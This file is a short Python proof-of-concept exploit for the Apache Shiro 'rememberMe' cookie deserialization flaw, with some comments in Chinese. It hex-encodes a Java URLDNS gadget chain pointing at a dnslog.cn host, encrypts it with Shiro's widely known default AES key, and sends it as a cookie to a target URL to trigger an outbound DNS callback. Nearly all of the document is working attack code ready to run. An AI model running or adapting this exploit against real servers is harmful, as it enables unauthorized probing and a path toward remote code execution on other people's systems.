import time
import base64
import uuid
import requests
import random
import binascii
from Crypto.Cipher import AES


def poc(url, target):
    try:
        payload = generator(target)
        requests.get(url, cookies={'rememberMe': payload.decode()}, timeout=10, verify=False)
        time.sleep(1)
        print("[+] Please check the URL：%s"% ('http://dnslog.cn/'))
    except Exception as e:
        print("异常对象的内容是%s"%e)


def generator(url):
    url0 = url
    url1 = 'http://' + url
    payload = 'aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff740010{0}74000071007e0005740004687474707078740017{1}78'.format(binascii.hexlify(url0.encode()).decode(),binascii.hexlify(url1.encode()).decode())
    payload = binascii.a2b_hex(payload)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(payload)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

print("[*]需要在额外方框内添加DNS域名,如 example.com")
def check(url, target=None):
    poc(url, target)

if __name__ == "__main__":
    url = ''
    target = 'rkee3m.dnslog.cn'
    poc(url, target)
    